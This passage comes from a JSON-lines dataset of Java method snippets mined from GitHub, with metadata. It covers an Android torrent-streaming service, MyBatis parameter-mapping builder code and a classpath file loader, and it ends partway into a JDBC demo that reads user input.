"https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/torrent/TorrentService.java", "stars": "4", "class_props": {"extends": "Service", "implements": ["TorrentServerListener"], "modifiers": ["public"]}}, {"id": 33355, "method_name": "onRebind", "class_name": "TorrentService", "params": ["Intent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onRebind(Intent intent) {\n        super.onRebind(intent);\n        Timber.d(\"onRebind\");\n\n        if (mInForeground) {\n            stopForeground();\n        }\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/torrent/TorrentService.java", "stars": "4", "class_props": {"extends": "Service", "implements": ["TorrentServerListener"], "modifiers": ["public"]}}, {"id": 33356, "method_name": "setCurrentActivity", "class_name": "TorrentService", "params": ["TorrentActivity"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setCurrentActivity(TorrentActivity activity) {\n        mCurrentActivityClass = activity.getClass();\n\n        if (mInForeground) {\n            stopForeground();\n            startForeground();\n        }\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/torrent/TorrentService.java", "stars": "4", "class_props": {"extends": "Service", "implements": ["TorrentServerListener"], "modifiers": ["public"]}}, {"id": 33357, "method_name": "startForeground", "class_name": "TorrentService", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void startForeground() {\n        if (Foreground.get().isForeground()) return;\n        if (mCurrentActivityClass == null) return;\n\n        Intent notificationIntent = new Intent(this, mCurrentActivityClass);\n        notificationIntent.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP | Intent.FLAG_ACTIVITY_SINGLE_TOP);\n        PendingIntent pendingIntent = PendingIntent.getActivity(this, 0, notificationIntent, 0);\n\n        Intent stopIntent = new Intent(this, TorrentBroadcastReceiver.class);\n        stopIntent.setAction(TorrentBroadcastReceiver.STOP);\n        PendingIntent pendingStopIntent = PendingIntent.getBroadcast(this, TorrentBroadcastReceiver.REQUEST_CODE, stopIntent, PendingIntent.FLAG_UPDATE_CURRENT);\n\n        NotificationCompat.Action stopAction = new NotificationCompat.Action.Builder(R.drawable.abc_ic_clear_material, getString(R.string.stop), pendingStopIntent).build();\n\n        NotificationCompat.Builder builder = new NotificationCompat.Builder(this, getPackageName())\n                .setSmallIcon(R.drawable.ic_video_white_24dp)\n                .setContentTitle(getString(R.string.app_name) + \" - \" + getString(R.string.running))\n                .setContentText(getString(R.string.tap_to_resume))\n                .setOngoing(true)\n                .setOnlyAlertOnce(true)\n                .setPriority(NotificationCompat.PRIORITY_HIGH)\n                .setContentIntent(pendingIntent)\n                .addAction(stopAction)\n                .setAutoCancel(true)\n                .setCategory(NotificationCompat.CATEGORY_SERVICE)\n                .setDefaults(Notification.DEFAULT_SOUND);\n\n        if (mStreamStatus != null && mIsReady) {\n            String downloadSpeed;\n            DecimalFormat df = new DecimalFormat(\"#############0.00\");\n            if (mStreamStatus.downloadSpeed / 1024 < 1000) {\n                downloadSpeed = df.format(mStreamStatus.downloadSpeed / 1024) + \" KB/s\";\n            } else {\n                downloadSpeed = df.format(mStreamStatus.downloadSpeed / (1024 * 1024)) + \" MB/s\";\n            }\n            String progress = df.format(mStreamStatus.progress);\n            builder.setContentText(progress + \"%, \u2193\" + downloadSpeed);\n        }\n\n        NotificationManager manager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);\n\n        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {\n            NotificationChannel chan = new NotificationChannel(getPackageName(), \"Torrent Download Progress\", NotificationManager.IMPORTANCE_HIGH);\n            chan.setLightColor(Color.BLUE);\n            chan.setLockscreenVisibility(Notification.VISIBILITY_PRIVATE);\n            manager.createNotificationChannel(chan);\n        }\n\n        Notification notification = builder.build();\n        manager.notify(NOTIFICATION_ID, notification);\n\n        startForeground(NOTIFICATION_ID, notification);\n\n        if (mUpdateTimer == null) {\n            mUpdateTimer = new Timer();\n            mUpdateTimer.scheduleAtFixedRate(new UpdateTask(), 5000, 5000);\n        }\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/torrent/TorrentService.java", "stars": "4", "class_props": {"extends": "Service", "implements": ["TorrentServerListener"], "modifiers": ["public"]}}, {"id": 33358, "method_name": "stopForeground", "class_name": "TorrentService", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void stopForeground() {\n        stopForeground(true);\n        if (mUpdateTimer != null) {\n            mUpdateTimer.cancel();\n            mUpdateTimer.purge();\n            mUpdateTimer = null;\n        }\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/torrent/TorrentService.java", "stars": "4", "class_props": {"extends": "Service", "implements": ["TorrentServerListener"], "modifiers": ["public"]}}, {"id": 33359, "method_name": "streamTorrent", "class_name": "TorrentService", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void streamTorrent(@NonNull final String torrentUrl) {\n        Timber.d(\"streamTorrent\");\n        mStopped = false;\n\n        if (mTorrentStreamServer.isStreaming()) return;\n\n        Timber.d(\"Starting streaming\");\n\n        PowerManager powerManager = (PowerManager) getSystemService(Context.POWER_SERVICE);\n        if (mWakeLock != null && mWakeLock.isHeld()) {\n            mWakeLock.release();\n            mWakeLock = null;\n        }\n        String WAKE_LOCK = \"PCT:TorrentService_WakeLock\";\n        mWakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, WAKE_LOCK);\n        mWakeLock.acquire();\n\n        mTorrentStreamServer.setTorrentOptions(getTorrentOptions());\n\n        mIsReady = false;\n        mTorrentStreamServer.addListener(this);\n        try {\n            mTorrentStreamServer.startStream(torrentUrl);\n        } catch (IOException | TorrentStreamNotInitializedException e) {\n            Timber.e(\"Error occurred\", e);\n        }\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/torrent/TorrentService.java", "stars": "4", "class_props": {"extends": "Service", "implements": ["TorrentServerListener"], "modifiers": ["public"]}}, {"id": 33360, "method_name": "stopStreaming", "class_name": "TorrentService", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void stopStreaming() {\n        mStopped = true;\n        mTorrentStreamServer.removeListener(this);\n\n        if (mWakeLock != null && mWakeLock.isHeld())\n            mWakeLock.release();\n\n        if (!mTorrentStreamServer.isStreaming())\n            return;\n\n        stopForeground();\n\n        mTorrentStreamServer.stopStream();\n        mIsReady = false;\n\n        Timber.d(\"Stopped torrent and removed files if possible\");\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/torrent/TorrentService.java", "stars": "4", "class_props": {"extends": "Service", "implements": ["TorrentServerListener"], "modifiers": ["public"]}}, {"id": 33361, "method_name": "stopService", "class_name": "TorrentService", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void stopService() {\n        if (sThis.isStreaming()) {\n            sThis.stopStreaming();\n        } else {\n            sThis.stopForeground();\n        }\n\n        if (sThis.mContext != null) {\n            ((Activity) sThis.mContext).finish();\n        }\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/torrent/TorrentService.java", "stars": "4", "class_props": {"extends": "Service", "implements": ["TorrentServerListener"], "modifiers": ["public"]}}, {"id": 33362, "method_name": "isStreaming", "class_name": "TorrentService", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isStreaming() {\n        return mTorrentStreamServer.isStreaming();\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/torrent/TorrentService.java", "stars": "4", "class_props": {"extends": "Service", "implements": ["TorrentServerListener"], "modifiers": ["public"]}}, {"id": 33363, "method_name": "isReady", "class_name": "TorrentService", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isReady() {\n        return mIsReady;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/torrent/TorrentService.java", "stars": "4", "class_props": {"extends": "Service", "implements": ["TorrentServerListener"], "modifiers": ["public"]}}, {"id": 33364, "method_name": "checkStopped", "class_name": "TorrentService", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean checkStopped() {\n        if (mStopped) {\n            mStopped = false;\n            return true;\n        }\n        return false;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/torrent/TorrentService.java", "stars": "4", "class_props": {"extends": "Service", "implements": ["TorrentServerListener"], "modifiers": ["public"]}}, {"id": 33365, "method_name": "addListener", "class_name": "TorrentService", "params": ["TorrentServerListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void addListener(@NonNull TorrentServerListener listener) {\n        mListener.add(listener);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/torrent/TorrentService.java", "stars": "4", "class_props": {"extends": "Service", "implements": ["TorrentServerListener"], "modifiers": ["public"]}}, {"id": 33366, "method_name": "removeListener", "class_name": "TorrentService", "params": ["TorrentServerListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void removeListener(@NonNull TorrentServerListener listener) {\n        mListener.remove(listener);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/torrent/TorrentService.java", "stars": "4", "class_props": {"extends": "Service", "implements": ["TorrentServerListener"], "modifiers": ["public"]}}, {"id": 33367, "method_name": "bindHere", "class_name": "TorrentService", "params": ["Context", "ServiceConnection"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void bindHere(Context context, ServiceConnection serviceConnection) {\n        Intent torrentServiceIntent = new Intent(context, TorrentService.class);\n        context.bindService(torrentServiceIntent, serviceConnection, Context.BIND_AUTO_CREATE);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/torrent/TorrentService.java", "stars": "4", "class_props": {"extends": "Service", "implements": ["TorrentServerListener"], "modifiers": ["public"]}}, {"id": 33368, "method_name": "start", "class_name": "TorrentService", "params": ["Context"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void start(Context context) {\n        Intent torrentServiceIntent = new Intent(context, TorrentService.class);\n        context.startService(torrentServiceIntent);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/torrent/TorrentService.java", "stars": "4", "class_props": {"extends": "Service", "implements": ["TorrentServerListener"], "modifiers": ["public"]}}, {"id": 33369, "method_name": "stop", "class_name": "TorrentService", "params": [], "throws": null, "modifiers": ["static"], "return_type": "void", "snippet": "    static void stop() {\n        if (sThis.isStreaming()) {\n            sThis.stopStreaming();\n        } else {\n            sThis.stopForeground();\n        }\n\n        if (sThis.mContext != null) {\n            ((Activity) sThis.mContext).finish();\n        }\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/torrent/TorrentService.java", "stars": "4", "class_props": {"extends": "Service", "implements": ["TorrentServerListener"], "modifiers": ["public"]}}, {"id": 33370, "method_name": "setStreamLoadingActivityContext", "class_name": "TorrentService", "params": ["Context"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setStreamLoadingActivityContext(Context context) {\n        mContext = context;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/torrent/TorrentService.java", "stars": "4", "class_props": {"extends": "Service", "implements": ["TorrentServerListener"], "modifiers": ["public"]}}, {"id": 33371, "method_name": "getCurrentTorrent", "class_name": "TorrentService", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Torrent", "snippet": "    public Torrent getCurrentTorrent() {\n        return mCurrentTorrent;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/torrent/TorrentService.java", "stars": "4", "class_props": {"extends": "Service", "implements": ["TorrentServerListener"], "modifiers": ["public"]}}, {"id": 33372, "method_name": "getCurrentTorrentUrl", "class_name": "TorrentService", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getCurrentTorrentUrl() {\n        return mTorrentStreamServer.getCurrentTorrentUrl();\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/torrent/TorrentService.java", "stars": "4", "class_props": {"extends": "Service", "implements": ["TorrentServerListener"], "modifiers": ["public"]}}, {"id": 33373, "method_name": "getCurrentStreamUrl", "class_name": "TorrentService", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getCurrentStreamUrl() {\n        return mCurrentStreamUrl;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/torrent/TorrentService.java", "stars": "4", "class_props": {"extends": "Service", "implements": ["TorrentServerListener"], "modifiers": ["public"]}}, {"id": 33374, "method_name": "onStreamPrepared", "class_name": "TorrentService", "params": ["Torrent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onStreamPrepared(Torrent torrent) {\n        mCurrentTorrent = torrent;\n\n        for (TorrentServerListener listener : mListener) {\n            listener.onStreamPrepared(torrent);\n        }\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/torrent/TorrentService.java", "stars": "4", "class_props": {"extends": "Service", "implements": ["TorrentServerListener"], "modifiers": ["public"]}}, {"id": 33375, "method_name": "onStreamStarted", "class_name": "TorrentService", "params": ["Torrent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onStreamStarted(Torrent torrent) {\n        for (TorrentServerListener listener : mListener) {\n            listener.onStreamStarted(torrent);\n        }\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/torrent/TorrentService.java", "stars": "4", "class_props": {"extends": "Service", "implements": ["TorrentServerListener"], "modifiers": ["public"]}}, {"id": 33376, "method_name": "onStreamError", "class_name": "TorrentService", "params": ["Torrent", "Exception"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onStreamError(Torrent torrent, Exception e) {\n        for (TorrentServerListener listener : mListener) {\n            listener.onStreamError(torrent, e);\n        }\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/torrent/TorrentService.java", "stars": "4", "class_props": {"extends": "Service", "implements": ["TorrentServerListener"], "modifiers": ["public"]}}, {"id": 33377, "method_name": "onStreamReady", "class_name": "TorrentService", "params": ["Torrent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onStreamReady(Torrent torrent) {\n        mCurrentTorrent = torrent;\n\n        for (TorrentServerListener listener : mListener) {\n            listener.onStreamReady(torrent);\n        }\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/torrent/TorrentService.java", "stars": "4", "class_props": {"extends": "Service", "implements": ["TorrentServerListener"], "modifiers": ["public"]}}, {"id": 33378, "method_name": "onStreamProgress", "class_name": "TorrentService", "params": ["Torrent", "StreamStatus"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onStreamProgress(Torrent torrent, StreamStatus streamStatus) {\n        for (TorrentServerListener listener : mListener) {\n            if (null != listener) {\n                listener.onStreamProgress(torrent, streamStatus);\n            }\n        }\n\n        if (mInForeground) {\n            mStreamStatus = streamStatus;\n        }\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/torrent/TorrentService.java", "stars": "4", "class_props": {"extends": "Service", "implements": ["TorrentServerListener"], "modifiers": ["public"]}}, {"id": 33379, "method_name": "onStreamStopped", "class_name": "TorrentService", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onStreamStopped() {\n        for (TorrentServerListener listener : mListener) {\n            if (listener != null) {\n                listener.onStreamStopped();\n            }\n        }\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/torrent/TorrentService.java", "stars": "4", "class_props": {"extends": "Service", "implements": ["TorrentServerListener"], "modifiers": ["public"]}}, {"id": 33380, "method_name": "onServerReady", "class_name": "TorrentService", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onServerReady(String url) {\n        mIsReady = true;\n        mCurrentStreamUrl = url;\n\n        for (TorrentServerListener listener : mListener) {\n            if (listener != null) {\n                listener.onServerReady(url);\n            }\n        }\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/torrent/TorrentService.java", "stars": "4", "class_props": {"extends": "Service", "implements": ["TorrentServerListener"], "modifiers": ["public"]}}, {"id": 33381, "method_name": "getService", "class_name": "ServiceBinder", "params": [], "throws": null, "modifiers": ["public"], "return_type": "TorrentService", "snippet": "        public TorrentService getService() {\n            return TorrentService.this;\n        }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/torrent/TorrentService.java", "stars": "4", "class_props": {"extends": "Binder", "implements": null, "modifiers": ["public"]}}, {"id": 33382, "method_name": "run", "class_name": "UpdateTask", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void run() {\n            if (mInForeground) {\n                startForeground();\n            } else {\n                stopForeground();\n            }\n        }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/torrent/TorrentService.java", "stars": "4", "class_props": {"extends": "TimerTask", "implements": null, "modifiers": ["private"]}}, {"id": 33383, "method_name": "getProperty", "class_name": "ParameterMapping", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getProperty() {\n    return property;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/mapping/ParameterMapping.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33384, "method_name": "getMode", "class_name": "ParameterMapping", "params": [], "throws": null, "modifiers": ["public"], "return_type": "ParameterMode", "snippet": "  public ParameterMode getMode() {\n    return mode;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/mapping/ParameterMapping.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33385, "method_name": "getJavaType", "class_name": "ParameterMapping", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Class<?>", "snippet": "  public Class<?> getJavaType() {\n    return javaType;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/mapping/ParameterMapping.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33386, "method_name": "getJdbcType", "class_name": "ParameterMapping", "params": [], "throws": null, "modifiers": ["public"], "return_type": "JdbcType", "snippet": "  public JdbcType getJdbcType() {\n    return jdbcType;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/mapping/ParameterMapping.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33387, "method_name": "getNumericScale", "class_name": "ParameterMapping", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "  public Integer getNumericScale() {\n    return numericScale;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/mapping/ParameterMapping.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33388, "method_name": "getTypeHandler", "class_name": "ParameterMapping", "params": [], "throws": null, "modifiers": ["public"], "return_type": "TypeHandler<?>", "snippet": "  public TypeHandler<?> getTypeHandler() {\n    return typeHandler;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/mapping/ParameterMapping.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33389, "method_name": "getResultMapId", "class_name": "ParameterMapping", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getResultMapId() {\n    return resultMapId;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/mapping/ParameterMapping.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33390, "method_name": "getJdbcTypeName", "class_name": "ParameterMapping", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getJdbcTypeName() {\n    return jdbcTypeName;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/mapping/ParameterMapping.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33391, "method_name": "getExpression", "class_name": "ParameterMapping", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getExpression() {\n    return expression;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/mapping/ParameterMapping.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33392, "method_name": "toString", "class_name": "ParameterMapping", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String toString() {\n    final StringBuilder sb = new StringBuilder(\"ParameterMapping{\");\n    //sb.append(\"configuration=\").append(configuration); // configuration doesn't have a useful .toString()\n    sb.append(\"property='\").append(property).append('\\'');\n    sb.append(\", mode=\").append(mode);\n    sb.append(\", javaType=\").append(javaType);\n    sb.append(\", jdbcType=\").append(jdbcType);\n    sb.append(\", numericScale=\").append(numericScale);\n    //sb.append(\", typeHandler=\").append(typeHandler); // typeHandler also doesn't have a useful .toString()\n    sb.append(\", resultMapId='\").append(resultMapId).append('\\'');\n    sb.append(\", jdbcTypeName='\").append(jdbcTypeName).append('\\'');\n    sb.append(\", expression='\").append(expression).append('\\'');\n    sb.append('}');\n    return sb.toString();\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/mapping/ParameterMapping.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33393, "method_name": "mode", "class_name": "Builder", "params": ["ParameterMode"], "throws": null, "modifiers": ["public"], "return_type": "Builder", "snippet": "    public Builder mode(ParameterMode mode) {\n      parameterMapping.mode = mode;\n      return this;\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/mapping/ParameterMapping.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 33394, "method_name": "javaType", "class_name": "Builder", "params": ["Class<?>"], "throws": null, "modifiers": ["public"], "return_type": "Builder", "snippet": "    public Builder javaType(Class<?> javaType) {\n      parameterMapping.javaType = javaType;\n      return this;\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/mapping/ParameterMapping.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 33395, "method_name": "jdbcType", "class_name": "Builder", "params": ["JdbcType"], "throws": null, "modifiers": ["public"], "return_type": "Builder", "snippet": "    public Builder jdbcType(JdbcType jdbcType) {\n      parameterMapping.jdbcType = jdbcType;\n      return this;\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/mapping/ParameterMapping.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 33396, "method_name": "numericScale", "class_name": "Builder", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "Builder", "snippet": "    public Builder numericScale(Integer numericScale) {\n      parameterMapping.numericScale = numericScale;\n      return this;\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/mapping/ParameterMapping.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 33397, "method_name": "resultMapId", "class_name": "Builder", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Builder", "snippet": "    public Builder resultMapId(String resultMapId) {\n      parameterMapping.resultMapId = resultMapId;\n      return this;\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/mapping/ParameterMapping.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 33398, "method_name": "typeHandler", "class_name": "Builder", "params": ["TypeHandler<?>"], "throws": null, "modifiers": ["public"], "return_type": "Builder", "snippet": "    public Builder typeHandler(TypeHandler<?> typeHandler) {\n      parameterMapping.typeHandler = typeHandler;\n      return this;\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/mapping/ParameterMapping.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 33399, "method_name": "jdbcTypeName", "class_name": "Builder", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Builder", "snippet": "    public Builder jdbcTypeName(String jdbcTypeName) {\n      parameterMapping.jdbcTypeName = jdbcTypeName;\n      return this;\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/mapping/ParameterMapping.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 33400, "method_name": "expression", "class_name": "Builder", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Builder", "snippet": "    public Builder expression(String expression) {\n      parameterMapping.expression = expression;\n      return this;\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/mapping/ParameterMapping.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 33401, "method_name": "build", "class_name": "Builder", "params": [], "throws": null, "modifiers": ["public"], "return_type": "ParameterMapping", "snippet": "    public ParameterMapping build() {\n      resolveTypeHandler();\n      validate();\n      return parameterMapping;\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/mapping/ParameterMapping.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 33402, "method_name": "validate", "class_name": "Builder", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void validate() {\n      if (ResultSet.class.equals(parameterMapping.javaType)) {\n        if (parameterMapping.resultMapId == null) {\n          throw new IllegalStateException(\"Missing resultmap in property '\"\n              + parameterMapping.property + \"'.  \"\n              + \"Parameters of type java.sql.ResultSet require a resultmap.\");\n        }\n      } else {\n        if (parameterMapping.typeHandler == null) {\n          throw new IllegalStateException(\"Type handler was null on parameter mapping for property '\"\n            + parameterMapping.property + \"'. It was either not specified and/or could not be found for the javaType (\"\n            + parameterMapping.javaType.getName() + \") : jdbcType (\" + parameterMapping.jdbcType + \") combination.\");\n        }\n      }\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/mapping/ParameterMapping.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 33403, "method_name": "resolveTypeHandler", "class_name": "Builder", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void resolveTypeHandler() {\n      if (parameterMapping.typeHandler == null && parameterMapping.javaType != null) {\n        Configuration configuration = parameterMapping.configuration;\n        TypeHandlerRegistry typeHandlerRegistry = configuration.getTypeHandlerRegistry();\n        parameterMapping.typeHandler = typeHandlerRegistry.getTypeHandler(parameterMapping.javaType, parameterMapping.jdbcType);\n      }\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/mapping/ParameterMapping.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 33404, "method_name": "loadFileFromClasspath", "class_name": "ClasspathHelper", "params": ["String"], "throws": null, "modifiers": ["static"], "return_type": "String", "snippet": "    static String loadFileFromClasspath(String location) {\n\n        InputStream inputStream = ClasspathHelper.class.getResourceAsStream(location);\n\n        if (inputStream == null) {\n            inputStream = ClasspathHelper.class.getClassLoader().getResourceAsStream(location);\n        }\n\n        if (inputStream == null) {\n            inputStream = ClassLoader.getSystemResourceAsStream(location);\n        }\n\n        if (inputStream != null) {\n            try {\n                return IOUtils.toString(inputStream, Charset.defaultCharset());\n            } catch (IOException e) {\n                throw new RuntimeException(\"Could not read \" + location + \" from the classpath\", e);\n            }\n        }\n\n        throw new RuntimeException(\"Could not find \" + location + \" on the classpath\");\n    }", "url": "https://raw.githubusercontent.com/hvalls/vertx-asyncapi-contract/master/src/main/java/com/hvalls/vertx/asyncapi/ClasspathHelper.java", "stars": "9", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 33405, "method_name": "main", "class_name": "JDBCDemo9", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) {\n        //1\u3001\u952e\u76d8\u5f55\u5165\n        Scanner sc = new Scanner(System.in);\n        System.out.println(\"\u8bf7\u8f93\u5165\u7528\u6237\u540d\uff1a\");\n        String username = 